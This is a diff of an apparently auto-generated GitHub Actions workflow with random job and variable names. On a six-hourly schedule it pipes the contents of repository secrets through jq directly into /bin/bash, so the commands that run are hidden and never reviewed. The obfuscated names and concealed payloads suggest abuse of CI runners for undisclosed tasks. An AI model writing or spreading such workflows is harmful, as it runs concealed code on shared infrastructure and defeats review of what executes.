@@ -1,11 +1,10 @@
 name: gewangshui4637
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 4/6 * * *'
+    - cron: '58 2/6 * * *'
 
-jobs:  # 19972
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,20 +12,9 @@ jobs:  # 19972
       - uses: actions/checkout@v4
       - name: gewangshui4637
         env:
-          vii4: ${{ secrets.vii4 }}
+          u1: ${{ secrets.u1 }}
         run: |
-          echo $vii4 | jq -r .elnk204 | /bin/bash
-          echo $jxaxw18 | jq -r .ffev613 | /bin/bash
-          echo $u45935 | jq -r .qzmm13557 | /bin/bash
-          echo $lgh7130 | jq -r .dtcp444 | /bin/bash
-          echo $g29863 | jq -r .vvr39 | /bin/bash
-          echo $fcull991 | jq -r .jo51 | /bin/bash
-          echo $m970 | jq -r .viqga81869 | /bin/bash
-          echo $cmeh0804 | jq -r .vry49917 | /bin/bash
-          echo $jj47 | jq -r .vjykc084 | /bin/bash
-          echo $c60 | jq -r .f03471 | /bin/bash
-          echo $gv59541 | jq -r .q837 | /bin/bash
-          echo $bjg118 | jq -r .e27259 | /bin/bash
-          echo $f8 | jq -r .qjrr2290 | /bin/bash
-          echo $brtqo77331 | jq -r .eo248 | /bin/bash
+          echo $u1 | jq -r .qx34858 | /bin/bash
+          echo $qt8309 | jq -r .lkt9393 | /bin/bash
+          echo $occ7 | jq -r .er58748 | /bin/bash
 
